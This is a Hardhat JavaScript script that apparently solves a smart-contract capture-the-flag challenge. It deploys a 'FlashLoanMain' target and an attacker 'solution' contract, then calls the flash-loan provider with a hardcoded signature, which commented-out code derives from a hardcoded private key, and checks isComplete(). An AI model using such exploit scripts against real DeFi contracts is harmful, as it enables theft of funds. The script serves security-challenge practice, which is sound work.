const { ethers } = require("hardhat");

async function deploy(deployer) {
  const FlashLoanMain = await ethers.getContractFactory(
    "FlashLoanMain",
    deployer
  );
  const flashLoanMain = await FlashLoanMain.deploy();
  console.log("FlashLoanMain contract:", flashLoanMain.address);

  // await expect(await FlashLoanMain.numOfFree()).to.equal(0);
  return flashLoanMain;
}

async function exploit(target, attacker) {
  const FlashLoanMainSolution = await ethers.getContractFactory(
    "FlashLoanMainSolution",
    attacker
  );

  const solution = await FlashLoanMainSolution.deploy(target.address);
  console.log("Solution contract:", solution.address);
  console.log(
    "Before: isComplete():",
    await target.connect(attacker).isComplete()
  );
  // let flashLoanPriveder_address = await target.flashLoanPriveder();

  // let  messagehash = ethers.utils.solidityKeccak256(
  //     ["address", "uint256","address", "address"], [flashLoanPriveder_address,1,solution.address,solution.address]
  // )
  // let privateKey="0xf8f8a2f43c8376ccb0871305060d7b27b0554d2cc72bccf41b2705608452f315"
  // let sign = new  ethers.Wallet(privateKey)
  // let signature=sign.signMessage(messagehash)
  let signature =
    "0xc86950c20d9cb853cf71453805034b08621a604c1a4845fdbb15855f9fcae0a63258d8d7ec0d7458f074b1f8e1c159b2fe94ed62e93fa0dd0ee5c4f13d6a4f441b";

  const FlashLoanPriveder = await ethers.getContractFactory(
    "FlashLoanPriveder"
  );
  const flashLoanPriveder = await FlashLoanPriveder.attach(
    await target.flashLoanPriveder()
  );
  await flashLoanPriveder
    .connect(attacker)
    .flashLoan(solution.address, solution.address, 1, signature, 0x12);

  console.log(
    "After: isComplete():",
    await target.connect(attacker).isComplete()
  );
}

async function main() {
  let [deployer, attacker] = await ethers.getSigners();
  let flashLoanMain = await deploy(deployer);

  await exploit(flashLoanMain, attacker);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
